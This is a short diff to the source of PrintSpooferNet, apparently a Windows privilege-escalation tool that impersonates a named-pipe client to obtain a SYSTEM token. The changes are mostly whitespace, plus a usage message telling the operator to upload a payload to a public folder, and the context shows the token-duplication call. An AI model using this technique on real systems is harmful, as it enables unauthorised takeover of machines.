@@ -19,8 +19,8 @@ namespace PrintSpooferNet
         }
 
         public enum TOKEN_TYPE
-        { 
-            TokenPrimary=1,
+        {
+            TokenPrimary = 1,
             TokenImpersonation
         }
 
@@ -135,7 +135,7 @@ namespace PrintSpooferNet
 
             if (args.Length == 0)
             {
-                Console.WriteLine("Usage: PrintSpooferNet.exe pipename\ne.g. \n\tPrintSpooferNet.exe \\\\.\\pipe\\test\\pipe\\spoolss\n\tSpoolSample_x64.exe appsrv01 appsrv01/pipe/test\n\tPrintSpooferNet.exe \\\\.\\pipe\\test");
+                Console.WriteLine("Usage: PrintSpooferNet.exe pipename\tDon't forget to upload payload to C:\\users\\public\\xd.exe\ne.g. \n\tPrintSpooferNet.exe \\\\.\\pipe\\test\\pipe\\spoolss\n\tSpoolSample_x64.exe appsrv01 appsrv01/pipe/test\n\tPrintSpooferNet.exe \\\\.\\pipe\\test");
                 return;
             }
             string pipeName = args[0];
@@ -158,7 +158,7 @@ namespace PrintSpooferNet
             string sidstr = Marshal.PtrToStringAuto(pstr);
             Console.WriteLine(@"Found sid {0}", sidstr);*/
 
-            
+
             DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
 
             StringBuilder sbSystemDir = new StringBuilder(256);
